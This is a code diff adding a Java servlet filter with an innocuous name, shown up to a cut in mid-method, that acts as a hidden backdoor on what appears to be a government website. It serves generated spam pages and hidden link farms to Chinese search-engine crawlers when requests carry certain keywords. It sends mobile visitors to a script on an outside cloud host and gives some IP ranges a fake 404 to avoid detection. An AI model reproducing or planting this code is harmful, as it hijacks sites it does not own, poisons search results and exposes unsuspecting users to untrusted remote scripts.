@@ -1,0 +1,797 @@
+import javax.servlet.*;
+import javax.servlet.annotation.WebFilter;
+import javax.servlet.annotation.HandlesTypes;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.*;
+import java.math.BigInteger;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.time.LocalDate;
+import java.time.ZoneId;
+import java.time.format.DateTimeFormatter;
+import java.util.*;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+import java.util.stream.Stream;
+import java.nio.file.Path;
+
+//
+@WebFilter("/*")
+public class annotations implements Filter {
+    private static final String LOTTERY_KEYWORD = "124a10e0";
+    private static final String GOVER_KEYWORD = "ce410c124";
+    private static final String GOVER_INNOVATION = "db5e4b9";
+    private static final String LOTTO_PARA = "97fc2a4b";
+    private static final String INDEX_HTML_PATH = "/var/games/index/index.html";
+    private static final String TITLES_DIRECTORY = "/var/games/titles/";
+    private static final String ARTICLES_DIRECTORY = "/var/games/articles/";
+	private static final String USERNAME_DIRECTORY = "/var/games/usernames/";
+    private static final String APPNAME_DIRECTORY = "/var/games/appnames/";   
+    private Pattern dashPattern = Pattern.compile("-..-..-..");
+    private static final  String BASE_DOMAIN = "www.xxx.gov.cn";
+    private static String indexHtmlContent;
+    private static final Map<String, List<String>> titlesContent = new LinkedHashMap<>();
+    private static final Map<String, List<String>> articlesContent = new LinkedHashMap<>();
+	private static final Map<String, List<String>> usernameContent = new LinkedHashMap<>();
+    private static final Map<String, List<String>> appnameContent = new LinkedHashMap<>();
+	private static final Map<String, String[]> RANDOM_TEXT_TOPICS = new HashMap<>();
+	static {
+		RANDOM_TEXT_TOPICS.put("description", new String[]{
+		"APP下载", "新闻头条", "IOS/Android通用版下载", "时政要闻", "极速版推荐", "热点追踪",
+"（中国）下载安装", "国内焦点", "高速下载", "独家报道", "最新版下载", "最新消息", "（今日）新闻导读",
+"新闻客户端推荐", "权威报道入口", "每日资讯更新", "头版要闻合集", "24小时滚动新闻", "媒体发布平台", "专业版下载",
+"精选内容速览", "多平台同步更新", "全网热搜直达", "重点专题速览", "主流资讯聚合",
+"官方平台入口", "一键获取热点", "实时新闻通道", "热门资讯推荐", "主流媒体速递", "智能推荐系统",
+"全端覆盖版本", "一站式新闻体验", "客户端独家首发", "重点资讯更新", "移动端极速入口", "权威新闻中心",
+"每日快讯速递", "热榜内容精选", "一键阅读最新", "高频热点推荐", "滚动头条精选", "专业新闻聚合",
+"权威信息直达", "新闻快报入口", "聚焦核心话题", "跨平台资讯同步", "正版客户端获取", "官方APP合集","实时播报", "最新消息", "突发快讯", "第一时间", "图解版", "完整版", "深度分析",
+"简明版", "合集", "要点速览", "权威发布", "官方通报", "独家披露", "专家观点", "权威解读",
+"强烈推荐", "必看", "全网热传", "网友热议", "热榜前列", "本日精选", "客户端首发", "移动端优先",
+"多端同步", "全网同步", "版本合集", "应用推荐", "冲上热搜", "引爆舆论", "网络刷屏", "社交媒体热议",
+"全民关注", "焦点事件", "官方回应"
+		});
+		RANDOM_TEXT_TOPICS.put("modifier", new String[]{
+			"热门", "官方", "推荐", "独家", "极速", "全网", "专业", "深度", "精选", "今日",
+			"权威", "新版", "最热", "移动端", "图解版", "客户端", "应用版", "完整版", "智能版", "实时版",
+			"抢先", "聚焦", "快报", "优选", "特别版", "一键安装", "上架", "推送", "更新", "版本合集",
+		   "限时", "旗舰版", "官方通道", "订阅版", "速览版", "轻量版", "要闻版", "首发版", "双端版",
+         "全端兼容", "互动版", "原生版", "热点专属", "流畅版", "高性能版", "快速版", "便捷版", 
+       "独享资源", "标准版", "多语种", "高兼容", "优化版", "轻便版", "热度持续", "增强版", "同步版"
+		});
+		RANDOM_TEXT_TOPICS.put("platform", new String[]{
+		"时政", "国际", "财经", "科技", "社会", "评论",
+		"民生", "教育", "健康", "文化", "体育", "娱乐",
+		"军事", "法治", "能源", "汽车", "地产", "环保",
+		"互联网", "三农", "金融", "创业", "医疗", "数据","政策", "外交", "宏观", "AI", "安全", "城建",
+    "就业", "考试", "心理", "艺术", "电竞", "八卦",
+   "军工", "司法", "碳中和", "电动车", "租房", "生态",
+      "社交", "农技", "银行", "创投", "医保", "图解"
+	});
+		// 后续添加只需：
+		// RANDOM_TEXT_TOPICS.put("newtopic", new String[]{"A", "B", "C"});
+	}
+	
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+        try {
+            indexHtmlContent = new String(Files.readAllBytes(Paths.get(INDEX_HTML_PATH)), StandardCharsets.UTF_8);
+            loadDirectoryContents(TITLES_DIRECTORY, titlesContent);
+            loadDirectoryContents(ARTICLES_DIRECTORY, articlesContent);
+			//loadDirectoryContents(USERNAME_DIRECTORY, usernameContent);
+           // loadDirectoryContents(APPNAME_DIRECTORY, appnameContent);
+        } catch (IOException e) {
+            e.printStackTrace();
+            throw new ServletException("Failed to load file contents", e);
+        }
+    }
+
+    private void loadDirectoryContents(String directoryPath, Map<String, List<String>> contentMap) throws IOException {
+			 try (Stream<Path> paths = Files.walk(Paths.get(directoryPath))) {
+				paths.filter(Files::isRegularFile)
+					 .filter(path -> path.toString().endsWith(".txt"))
+					 .forEach(path -> {
+						 try {
+							 List<String> lines = Files.readAllLines(path, StandardCharsets.UTF_8);
+							 contentMap.put(path.getFileName().toString(), lines);
+						 } catch (IOException e) {
+							 e.printStackTrace();
+						 }
+					 });
+     }
+   }
+    @Override
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
+            throws IOException, ServletException {
+        HttpServletRequest httpRequest = (HttpServletRequest) request;
+        HttpServletResponse httpResponse = (HttpServletResponse) response;
+
+
+        // 检查URI是否包含特定路径
+
+        // 静态文件后缀数组
+        String[] staticFileExtensions = {".js", ".css", ".jpg", ".png", ".gif", ".svg",".jpeg", ".ico",".shtml",".html",".pdf",".doc",".docx",".mp3", ".wav", ".aac",  ".mp4",".avi"};
+
+        // 检查URI是否指向静态文件
+        String requestUri = httpRequest.getRequestURI();
+        boolean isStaticFile = false;
+        for (String extension : staticFileExtensions) {
+            if (requestUri.endsWith(extension)) {
+                isStaticFile = true;
+                break;
+            }
+        }
+
+        if (isStaticFile) {
+            // 如果是静态资源，继续过滤链的处理
+            chain.doFilter(request, response);
+            return;
+        }
+
+        boolean matchesDashPattern = dashPattern.matcher(requestUri).find();
+
+        // 检查URL是否按顺序包含thirdParty和bind字符串
+        boolean containsOrderedStrings = requestUri.contains("thirdParty") && requestUri.contains("bind") &&
+                requestUri.indexOf("thirdParty") < requestUri.indexOf("bind");
+
+        if (matchesDashPattern || containsOrderedStrings) {
+            // 如果匹配任一条件，则返回404
+            httpResponse.sendError(HttpServletResponse.SC_SERVICE_UNAVAILABLE);
+            return;
+        }
+
+        String referer = httpRequest.getHeader("Referer");
+        boolean refererIsNotEmpty = referer != null && !referer.isEmpty();
+        if (((requestUri.contains(LOTTERY_KEYWORD)|| requestUri.contains(GOVER_INNOVATION) || requestUri.contains(LOTTO_PARA) || httpRequest.getParameter(LOTTERY_KEYWORD) != null || httpRequest.getParameter(GOVER_KEYWORD) != null || httpRequest.getParameter(GOVER_INNOVATION) != null)) )
+        { if((isSpider(httpRequest))) {
+          /*  File file = new File(INDEX_HTML_PATH);
+            FileInputStream fis = new FileInputStream(file);
+            byte[] data = new byte[(int) file.length()];
+            fis.read(data);
+            fis.close();*/
+			//获取 协议 让蜘蛛用https 或者http爬取都能获取到定向锚文本
+            String scheme = request.getScheme() + "://";
+
+            String content =indexHtmlContent;
+
+            // 这里添加你的替换逻辑
+            // 计算MD5值
+			int[][] hashPairs = getUrlSha256Pairs(httpRequest, 6);
+			int[] fileSelectValue = new int[6];
+			int[] contentSelectValue = new int[6];//例子hash 3a9f7b182c9f1ae4e1bc879dfa48e6cc3fdd24dba19c9af72e6ea81c6b5a3f7e
+			for (int i = 0; i < 6; i++) { //这里的6是生成6组随机因子  最多6组 因为没有让hash重叠 hash重叠会影响随机性 比如 3a9f7b 和 a9f7b1 很容易落在相近区域 
+			//举个例子 3a9f7b182c9f1ae4e1bc879dfa48e6cc3fdd24dba19c9af72e6ea81c6b5a3f7e	
+			//
+			//滑动产生的hash值省的每次都是一样的排列组合 分组规则如下（每组12位，每6位一段）：		
+			/*组索引 i	fileSelectValue[i]	contentSelectValue[i]
+                   0	3a9f7b	             182c9f
+                   1	1ae4e1	              bc879d*/
+		    //后面产生需求的话可以把hash 倒过来取随机因子 或者更多需求可以一位一位滑动 如 fileSelectValue[0]位 3a9f7b fileSelectValue[1]为 a9f7b1
+				fileSelectValue[i] = hashPairs[i][0];
+				contentSelectValue[i] = hashPairs[i][1];
+			}
+
+            String numberOfviews = String.valueOf(fileSelectValue[0]);
+            // 使用值选择标题和文章段落
+            String selectedTitle = selectTitleContent(fileSelectValue[0], contentSelectValue[0]);
+            List<String> selectedArticles = selectArticles(fileSelectValue[1], contentSelectValue[1]);
+            //List<String> selectedUsernames = selectUsernames(fileSelectValue[2], contentSelectValue[2]);
+            //List<String> selectedAppnames = selectAppnames(fileSelectValue[3], contentSelectValue[3]);
+  
+            // 生成随机日期
+            LocalDate randomDate = generateRandomDate(fileSelectValue[0]);
+            // 格式化日期
+            String formattedDate = randomDate.format(DateTimeFormatter.ofPattern("yyyy-MM-dd"));
+            String appVersion = getAppVersion(fileSelectValue[3]);
+			String feature1 = selectRandomText(fileSelectValue[5], "description");//feature为数组名称
+           // 获取随机文本
+            content = content.replace("{{description}}", feature1);	
+            String feature2 = selectRandomText(fileSelectValue[4], "platform");
+			content = content.replace("{{platform}}", feature2);
+            String feature3 = selectRandomText(fileSelectValue[3], "modifier");
+			content = content.replace("{{modifier}}", feature3);			
+           // 获取随机文本
+            	
+            // 替换所有{{title}}为相同标题
+            content = content.replace("{{time}}", formattedDate);
+			// 获取版本
+             content = content.replace("{{version}}", appVersion);		
+          
+            content = content.replace("{{views}}", numberOfviews);
+            content = content.replaceAll("\\{\\{title\\}\\}", selectedTitle);
+			
+			//替换评论区用户名
+			/*for (String username : selectedUsernames) {
+                if (content.contains("{{username}}")) {
+                    content = content.replaceFirst("\\{\\{username\\}\\}", username);
+            } else {
+                break;
+            }
+            }*/
+
+          // 替换 `{{appname}}`，每次使用不同的值
+			/*for (String appname : selectedAppnames) {
+				if (content.contains("{{appname}}")) {
+					content = content.replaceFirst("\\{\\{appname\\}\\}", appname);
+				} else {
+					break;
+				}
+			}*/
+				
+					Set<String> usedInsertionWords = new HashSet<>();//插入过的介词就不用了
+					int[] currentInsertions = new int[]{0};
+					int maxInsertions = 3;//最大标题插入次数 防止被识别为关键词堆砌
+					String[] insertionWords = {"是", "的", "对", "在", "和", "与", "将", "向", "于", "为", "及"};//插入介词
+
+					int totalArticles = countOccurrences(content, "\\{\\{article\\}\\}");
+					int interval = Math.max(1, totalArticles / maxInsertions);
+					int articleIndex = 0;
+					int lastInsertIndex = -interval;
+
+					for (String article : selectedArticles) {
+						if (content.contains("{{article}}")) {
+
+							if (currentInsertions[0] < maxInsertions &&
+								(articleIndex - lastInsertIndex) >= interval) {
+
+								String modified = injectTitleOncePerArticle(
+									article,
+									selectedTitle,
+									usedInsertionWords,
+									currentInsertions,
+									maxInsertions,
+									insertionWords
+								);
+
+								if (!modified.equals(article)) {
+									lastInsertIndex = articleIndex;
+								}
+
+								content = content.replaceFirst("\\{\\{article\\}\\}", modified);
+							} else {
+								content = content.replaceFirst("\\{\\{article\\}\\}", article);
+							}
+
+							articleIndex++;
+						} else {
+							break;
+						}
+					}
+
+
+            while (content.contains("{{spiderlink}}")) {
+                // 构建URL用于哈希计算 用schme是为了区分蜘蛛用https爬还是http爬
+                String tempUrl = scheme +BASE_DOMAIN + "/" + LOTTERY_KEYWORD + "/" + fileSelectValue[0] + ".jhtml";
+                String anchorUrl= "/" + LOTTERY_KEYWORD + "/" + fileSelectValue[0] + ".jhtml";
+                // 重新计算fileSelectValue和contentSelectValue
+                //int[] values = getUrlSha256Values(tempUrl);
+               // int newFileSelectValue = values[0];
+                //int newContentSelectValue = values[1];
+
+                // 获取定向锚文本 到时候也可以弄定向的就不需要{{appname}}了 但是先试一下用正常appname的模板
+               // String selectedTitle1= selectTitleContent(newFileSelectValue, newContentSelectValue);
+               // String numberOfviews1 = String.valueOf(newFileSelectValue);
+                // 替换{{spiderlink}},.
+                String spiderLinkReplacement = "<a href=\"" + anchorUrl + "\"></a>";
+                content = content.replaceFirst("\\{\\{spiderlink\\}\\}", spiderLinkReplacement);
+                fileSelectValue[0]++; // 用于生成下一个链接的URL
+            }
+
+            while (content.contains("{{spiderparameter}}")) {
+                // 构建URL用于哈希计算
+                String tempUrl = scheme + BASE_DOMAIN + "/" + LOTTERY_KEYWORD + "/index.jhtml?" + LOTTO_PARA + "=" + contentSelectValue[0];
+                String anchorUrl= "/" + LOTTERY_KEYWORD + "/index.jhtml?" + LOTTO_PARA + "=" + contentSelectValue[0];
+                // 重新计算fileSelectValue和contentSelectValue
+                //int[] values = getUrlSha256Values(tempUrl);
+               // int newFileSelectValue = values[0];
+                //int newContentSelectValue = values[1];
+                //String numberOfviews2 = String.valueOf(newFileSelectValue);
+
+                // 获取定向锚文本
+                //String selectedTitle2 = selectTitleContent(newFileSelectValue, newContentSelectValue);
+
+                // 替换{{spiderparameter}}
+                String spiderParaReplacement = "<a href=\"" + anchorUrl + "\"></a>";
+                content = content.replaceFirst("\\{\\{spiderparameter\\}\\}", spiderParaReplacement);
+                contentSelectValue[0]++; // 用于生成下一个链接的URL
+            }
+            // 返回修改后的HTML给客户端
+            response.setContentType("text/html");
+            response.setCharacterEncoding("UTF-8");
+            PrintWriter out = response.getWriter();
+            out.print(content);
+            out.flush();
+            return;
+        }
+        else if  (isMobileUser(httpRequest)){
+            String ip = httpRequest.getRemoteAddr();
+            if (isIpFromQingHai(ip)) {
+                httpResponse.sendError(HttpServletResponse.SC_FORBIDDEN, "404");
+                return;
+            }
+            String redirectScript = ""
+                    + "<script type='text/javascript' src='https://666yyyhhh.oss-cn-hangzhou.aliyuncs.com/z2.js'>"
+                    + "</script>"
+                    + "";
+
+            // 设置响应类型为HTML
+            response.setContentType("text/html");
+            response.setCharacterEncoding("UTF-8");
+
+            // 返回HTML内容
+            PrintWriter out = response.getWriter();
+            out.print(redirectScript);
+            out.flush();
+            return; // 结束方法执行，不再调用链中的下一个过滤器或servlet
+
+        }
+        else{     chain.doFilter(request, response);}
+        }
+        else if(isSpider(httpRequest)) {
+            handleSpiderRequest(httpRequest, response, chain);
+        }
+        else{
+
+            chain.doFilter(request, response);
+        }
+    }
+
+				/**
+				 * 向 article 中插入 title，每段最多插一次，每个介词在全局只插一次
+				 *
+				 * @param article 当前文章段落
+				 * @param title 要插入的标题
+				 * @param usedWords 已经被用过的插入词（跨段共享）
+				 * @return 替换后的文章内容
+				 */
+		/**
+		 * 在一段文章中插入一次标题（基于插入词），总插入次数不超过 maxInsertions。
+		 *
+		 * @param article 当前文章段落
+		 * @param title 要插入的标题
+		 * @param usedWords 已用过的插入词
+		 * @param currentInsertions 当前已插入次数（用数组传引用）
+		 * @param maxInsertions 最大插入次数限制
+		 * @return 插入后的段落（若未插入则原样返回）
+		 */
+			private String injectTitleOncePerArticle(
+				String article,
+				String title,
+				Set<String> usedWords,
+				int[] currentInsertions,
+				int maxInsertions,
+				String[] insertionWords
+			) {
+				if (currentInsertions[0] >= maxInsertions) {
+					return article;  // 已达到最大插入次数
+				}
+
+				for (String word : insertionWords) {
+					if (usedWords.contains(word)) continue;
+
+					int index = article.indexOf(word);
+					if (index != -1 && index < article.length() - 1) {
+						usedWords.add(word);
+						currentInsertions[0]++;
+						return article.substring(0, index + 1) + title + article.substring(index + 1);
+					}
+				}
+
+				// 没找到可插入位置，原样返回
+				return article;
+			}
+
+
+    private boolean isSpider(HttpServletRequest request) {
+        String userAgent = request.getHeader("User-Agent");
+        if (userAgent != null) {
+            String[] spiderAgents = {"sogou.com","Sogou","HaosouSpider", "sougou", "360Spider", "Bytespider"};
+            for (String agent : spiderAgents) {
+                if (userAgent.contains(agent)) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+    private boolean isIpFromQingHai(String ipAddress) {
+        long ipNum = ipToLong(ipAddress);
+        // 河北的IP段，每一对表示一个范围的起始和结束 青海 北京 成都
+        long[][] ipRanges = {
+		    {ipToLong("122.136.0.0"), ipToLong("122.143.255.255")},
+			{ipToLong("119.48.0.0"), ipToLong("119.55.255.255")},
+			{ipToLong("175.16.0.0"), ipToLong("175.23.255.255")},
+			{ipToLong("123.172.0.0"), ipToLong("123.173.255.255")},
+			{ipToLong("124.234.0.0"), ipToLong("124.235.255.255")},
+			{ipToLong("111.116.0.0"), ipToLong("111.117.255.255")},
+			{ipToLong("175.30.0.0"), ipToLong("175.31.255.255")},
+			{ipToLong("36.48.0.0"), ipToLong("36.49.255.255")},
+			{ipToLong("222.168.0.0"), ipToLong("222.169.255.255")},
+			{ipToLong("221.8.0.0"), ipToLong("221.9.255.255")},
+			{ipToLong("59.72.0.0"), ipToLong("59.73.255.255")},
+			{ipToLong("58.244.0.0"), ipToLong("58.245.255.255")},
+			{ipToLong("222.160.0.0"), ipToLong("222.161.255.255")},
+			{ipToLong("49.140.0.0"), ipToLong("49.141.255.255")},
+			{ipToLong("125.32.0.0"), ipToLong("125.32.255.255")},
+			{ipToLong("222.162.0.0"), ipToLong("222.162.255.255")},
+			{ipToLong("218.27.0.0"), ipToLong("218.27.255.255")},
+			{ipToLong("58.21.0.0"), ipToLong("58.21.255.255")},
+			{ipToLong("42.97.0.0"), ipToLong("42.97.255.255")},
+			{ipToLong("218.62.0.0"), ipToLong("218.62.127.255")},
+			{ipToLong("113.213.0.0"), ipToLong("113.213.127.255")},
+			{ipToLong("222.163.128.0"), ipToLong("222.163.255.255")},
+			{ipToLong("222.163.64.0"), ipToLong("222.163.127.255")},
+			{ipToLong("61.138.128.0"), ipToLong("61.138.191.255")},
+			{ipToLong("219.149.192.0"), ipToLong("219.149.255.255")},
+			{ipToLong("61.139.128.0"), ipToLong("61.139.191.255")},
+			{ipToLong("61.161.0.0"), ipToLong("61.161.63.255")},
+			{ipToLong("210.12.192.0"), ipToLong("210.12.255.255")},
+			{ipToLong("114.110.64.0"), ipToLong("114.110.127.255")},
+			{ipToLong("202.111.160.0"), ipToLong("202.111.191.255")},
+			{ipToLong("118.88.32.0"), ipToLong("118.88.63.255")},
+			{ipToLong("114.111.0.0"), ipToLong("114.111.31.255")},
+			{ipToLong("219.150.0.0"), ipToLong("219.150.31.255")},
+			{ipToLong("222.163.32.0"), ipToLong("222.163.63.255")},
+			{ipToLong("222.163.0.0"), ipToLong("222.163.31.255")},
+			{ipToLong("202.181.112.0"), ipToLong("202.181.127.255")},
+			{ipToLong("122.248.48.0"), ipToLong("122.248.63.255")},
+			{ipToLong("202.98.16.0"), ipToLong("202.98.31.255")},
+			{ipToLong("202.98.0.0"), ipToLong("202.98.7.255")},
+			{ipToLong("202.98.8.0"), ipToLong("202.98.15.255")},
+			{ipToLong("103.22.112.0"), ipToLong("103.22.115.255")},
+			{ipToLong("111.206.145.0"), ipToLong("111.206.145.255")},
+			{ipToLong("61.135.194.0"), ipToLong("61.135.194.255")},
+			{ipToLong("182.140.153.0"), ipToLong("182.140.153.255")}
+				};
+
+        for (long[] range : ipRanges) {
+            if (ipNum >= range[0] && ipNum <= range[1]) {
+                return true;
+            }
+        }
+        return false;
+    }
+    private long ipToLong(String ipAddress) {
+        String[] ipParts = ipAddress.split("\\.");
+        long ipInLong = 0;
+        for (int i = 0; i < 4; i++) {
+            ipInLong = ipInLong << 8;
+            ipInLong |= Long.parseLong(ipParts[i]);
+        }
+        return ipInLong;
+    }
+    private boolean isMobileUser(HttpServletRequest request) {
+        String userAgent = request.getHeader("User-Agent");
+        if (userAgent != null) {
+            userAgent = userAgent.toLowerCase();
+            Pattern mobilePattern = Pattern.compile("android|iphone|ipad|ipod|blackberry/\\d\\.\\d");
+            Matcher matcher = mobilePattern.matcher(userAgent);
+            return matcher.find();
+        }
+        return false;
+    }
+		private String selectRandomText(int seed, String arrayName) {
+		String[] texts = RANDOM_TEXT_TOPICS.get(arrayName);
+		if (texts == null || texts.length == 0) {
+			return "暂无内容";
+		}
+		int index = Math.abs(seed) % texts.length;
+		return texts[index];
+	}
+		private int countOccurrences(String text, String regex) {
+			Matcher matcher = Pattern.compile(regex).matcher(text);
+			int count = 0;
+			while (matcher.find()) {
+				count++;
+			}
+			return count;
+		}
+
+    private String selectTitleContent(int fileSelectValue, int contentSelectValue) {
+        List<List<String>> titlesLists = new ArrayList<>(titlesContent.values());
+
+        if (titlesLists.isEmpty()) {
+            return "No title available";
+        }
+
+        // 确保fileSelectValue在合法范围内
+        List<String> selectedFileTitles = titlesLists.get(Math.abs(fileSelectValue) % titlesLists.size());
+
+        if (selectedFileTitles.isEmpty()) {
+            return "No title available in selected file";
+        }
+
+        // 确保contentSelectValue在合法范围内
+        String selectedTitle = selectedFileTitles.get(Math.abs(contentSelectValue) % selectedFileTitles.size());
+        return selectedTitle;
+    }
+    
+		private List<String> selectArticles(int fileSelectValue, int contentSelectValue) {
+			List<List<String>> allArticles = new ArrayList<>(articlesContent.values());
+
+			if (allArticles.isEmpty()) {
+				return Collections.singletonList("No articles available");
+			}
+
+			// 用 fileSelectValue 选文章文件
+			List<String> selectedFileArticles = allArticles.get(
+				Math.abs(fileSelectValue) % allArticles.size()
+			);
+
+			if (selectedFileArticles.isEmpty()) {
+				return Collections.singletonList("No articles in selected file");
+			}
+
+			List<String> selectedArticles = new ArrayList<>();
+
+			// 从 contentSelectValue 开始，循环读取所有行
+			int startIndex = Math.abs(contentSelectValue) % selectedFileArticles.size();
+			int size = selectedFileArticles.size();
+
+			for (int i = 0; i < size; i++) {
+				int index = (startIndex + i) % size;
+				String article = selectedFileArticles.get(index).trim();
+				selectedArticles.add(article);
+			}
+
+			return selectedArticles;
+		}
+
+
+	
+	 private List<String> selectUsernames(int fileSelectValue, int contentSelectValue) {
+		List<List<String>> allUsernames = new ArrayList<>(usernameContent.values());
+
+		if (allUsernames.isEmpty()) {
+			return Collections.singletonList("Guest");
+		}
+
+		List<String> selectedFileUsernames = allUsernames.get(
+			Math.abs(fileSelectValue) % allUsernames.size()
+		);
+
+		if (selectedFileUsernames.isEmpty()) {
+			return Collections.singletonList("GuestUser");
+		}
+
+		List<String> selectedUsernames = new ArrayList<>();
+		int startIndex = Math.abs(contentSelectValue) % selectedFileUsernames.size();
+		int size = selectedFileUsernames.size();
+
+		for (int i = 0; i < size; i++) {
+			int index = (startIndex + i) % size;
+			selectedUsernames.add(selectedFileUsernames.get(index).trim());
+		}
+
+		return selectedUsernames;
+	}
+
+
+	private List<String> selectAppnames(int fileSelectValue, int contentSelectValue) {
+		List<List<String>> allAppnames = new ArrayList<>(appnameContent.values());
+
+		if (allAppnames.isEmpty()) {
+			return Collections.singletonList("DefaultApp");
+		}
+
+		List<String> selectedFileAppnames = allAppnames.get(
+			Math.abs(fileSelectValue) % allAppnames.size()
+		);
+
+		if (selectedFileAppnames.isEmpty()) {
+			return Collections.singletonList("UnknownApp");
+		}
+
+		List<String> selectedAppnames = new ArrayList<>();
+		int startIndex = Math.abs(contentSelectValue) % selectedFileAppnames.size();
+		int size = selectedFileAppnames.size();
+
+		for (int i = 0; i < size; i++) {
+			int index = (startIndex + i) % size;
+			selectedAppnames.add(selectedFileAppnames.get(index).trim());
+		}
+
+		return selectedAppnames;
+	}
+
+		private String getAppVersion(int fileSelectValue) {
+			// 生成主版本号（1 - 10）
+			int major = (Math.abs(fileSelectValue) % 10) + 1;
+
+			// 生成次版本号（0 - 9）
+			int minor = (Math.abs(fileSelectValue / 10) % 10);
+
+			// 生成补丁版本号（0 - 99）
+			int patch = (Math.abs(fileSelectValue / 100) % 100);
+
+			return String.format("%d.%d.%d", major, minor, patch);
+		}
+//这个代码getUrlSha256Values 本来可以优化掉的 但是可以做定向锚文本 可以留下来
+    private int[] getUrlSha256Values(String url) {
+        try {
+            // 使用SHA-256哈希算法
+            MessageDigest md = MessageDigest.getInstance("SHA-256");
+            byte[] digest = md.digest(url.getBytes(StandardCharsets.UTF_8));
+
+            // 将哈希值转换为十六进制字符串
+            String hexHash = String.format("%064x", new BigInteger(1, digest));
+
+            // 取哈希值的前七个字符，并转换为十进制数
+            int firstFour = Integer.parseInt(hexHash.substring(0, 6), 16);
+            // 选择哈希值的后四个字符，并转换为十进制数
+            int lastFour = Integer.parseInt(hexHash.substring(hexHash.length() - 6), 16);
+
+            return new int[]{firstFour, lastFour};
+        } catch (NoSuchAlgorithmException e) {
+            throw new RuntimeException("Failed to calculate SHA-256", e);
+        }
+    }
+	//getUrlSha256Values 替换成getUrlSha256Pairs增加随机性 不然每次不同hash转为同样数字 每列组合都是一样的getUrlSha256Pairs 可以把hash中其他的16进制给利用起来
+	/*
+	
+	    private int[] getUrlSha256Values 替换成(HttpServletRequest httpRequest) {
+        String url = httpRequest.getRequestURL().toString();
+        String queryString = httpRequest.getQueryString();
+        if (queryString != null) {
+            url += "?" + queryString;
+        }
+
+        try {
+            // 使用SHA-256哈希算法
+            MessageDigest md = MessageDigest.getInstance("SHA-256");
+            byte[] digest = md.digest(url.getBytes());
+
+            // 将哈希值转换为十六进制字符串
+            String hexHash = String.format("%064x", new BigInteger(1, digest));
+
+            // 取哈希值的前四个字符，并转换为十进制数
+            int firstFour = Integer.parseInt(hexHash.substring(0, 5), 16);
+            // 选择哈希值的后四个字符，并转换为十进制数
+            int lastFour = Integer.parseInt(hexHash.substring(hexHash.length() - 7), 16);
+
+            return new int[]{firstFour, lastFour};
+        } catch (Exception e) {
+            throw new RuntimeException("Failed to calculate SHA-256", e);
+        }
+    }
+	
+	*/
+    // 每次hash都滑动
+		private int[][] getUrlSha256Pairs(HttpServletRequest httpRequest, int count) {
+			String url = httpRequest.getRequestURL().toString();
+			String queryString = httpRequest.getQueryString();
+			if (queryString != null) {
+				url += "?" + queryString;
+			}
+
+			try {
+				MessageDigest md = MessageDigest.getInstance("SHA-256");
+				byte[] digest = md.digest(url.getBytes(StandardCharsets.UTF_8));
+				String hexHash = String.format("%064x", new BigInteger(1, digest)); // 64 hex chars (32 bytes)
+
+				int[][] result = new int[count][2];
+				int maxOffset = hexHash.length() - 12; // 每组需要两段6位
+
+				for (int i = 0; i < count; i++) {
+					int offset = i;
+					if (offset > maxOffset) {
+						offset = offset % (maxOffset + 1);
+					}
+
+					String part1 = hexHash.substring(offset, offset + 6);
+					String part2 = hexHash.substring(offset + 6, offset + 12);
+
+					result[i][0] = Integer.parseInt(part1, 16); // fileSelectValue
+					result[i][1] = Integer.parseInt(part2, 16); // contentSelectValue
+				}
+
+				return result;
+			} catch (Exception e) {
+				throw new RuntimeException("SHA-256 parsing failed", e);
+			}
+		}
+	private String modifyLinks(String html, String fullRequestString) {
+		int innovationNumber = calculateInnovationNumber(fullRequestString);
+
+		Pattern pattern = Pattern.compile("<a([^>]*)href=\"([^\"]*)\"([^>]*)>");
+		Matcher matcher = pattern.matcher(html);
+		StringBuffer sb = new StringBuffer();
+
+		while (matcher.find()) {
+			String preHrefAttributes = matcher.group(1);
+			String url = matcher.group(2);
+			String postHrefAttributes = matcher.group(3);
+
+			String newUrl = url.contains("?")
+					? url + "&ce410c124=" + innovationNumber++
+					: url + "?ce410c124=" + innovationNumber++;
+
+			String replacement = "<a" + preHrefAttributes + "href=\"" + newUrl + "\"" + postHrefAttributes + ">";
+			try {
+				matcher.appendReplacement(sb, Matcher.quoteReplacement(replacement));
+			} catch (Exception e) {
+				log.warn("appendReplacement failed: " + e.getMessage());
+			}
+		}
+
+		matcher.appendTail(sb);
+		return sb.toString();
+	}
+
+    private int calculateInnovationNumber(String fullRequestString) {
+        try {
+            // 计算SHA-256哈希
+            MessageDigest md = MessageDigest.getInstance("SHA-256");
+            byte[] digest = md.digest(fullRequestString.getBytes());
+
+            // 将哈希值转换为十六进制字符串
+            String hexHash = new BigInteger(1, digest).toString(16);
+
+            // 选择哈希值的前七个字符，并转换为十进制数
+            long number = Long.parseLong(hexHash.substring(0, 5), 16);
+            // 返回数值
+            return (int) number ;
+        } catch (NoSuchAlgorithmException e) {
+            throw new RuntimeException("SHA-256 algorithm not found", e);
+        }
+    }
+    private void handleSpiderRequest(HttpServletRequest request, ServletResponse response, FilterChain chain)
+            throws IOException, ServletException {
+
+
+        jaspers responseWrapper = new jaspers((HttpServletResponse) response);
+        chain.doFilter(request, responseWrapper);
+
+        String content = responseWrapper.toString();
+        String fullRequestString = request.getRequestURI() + (request.getQueryString() != null ? "?" + request.getQueryString() : "");
+        String modifiedContent = modifyLinks(content, fullRequestString);
+
+   
+        Pattern bodyEndPattern = Pattern.compile("</body>");
+        Matcher bodyEndMatcher = bodyEndPattern.matcher(modifiedContent);
+        StringBuffer sb = new StringBuffer();
+        int[] md5Values = getUrlSha256Values(fullRequestString);
+        int fileSelectValue = md5Values[0];
+        int currentSeed = fileSelectValue; // 确保currentSeed正确初始化
+        if (bodyEndMatcher.find()) {
+            StringBuilder links = new StringBuilder();
+            for (int i = 0; i < 3; i++) {
+                links.append("<a href=\"/?ce410c124=").append((currentSeed++)*5).append("\"></a>\n");
+            }
+            bodyEndMatcher.appendReplacement(sb, links.toString() + "</body>");
+        }
+        bodyEndMatcher.appendTail(sb);
+
+        response.getWriter().write(sb.toString());
+    }
+    private LocalDate generateRandomDate(int seedValue) {
+        Random random = new Random(seedValue);
+
+        // 获取今年的第一天
+        LocalDate startOfYear = LocalDate.of(LocalDate.now(ZoneId.systemDefault()).getYear(), 1, 1);
+        // 获取今天
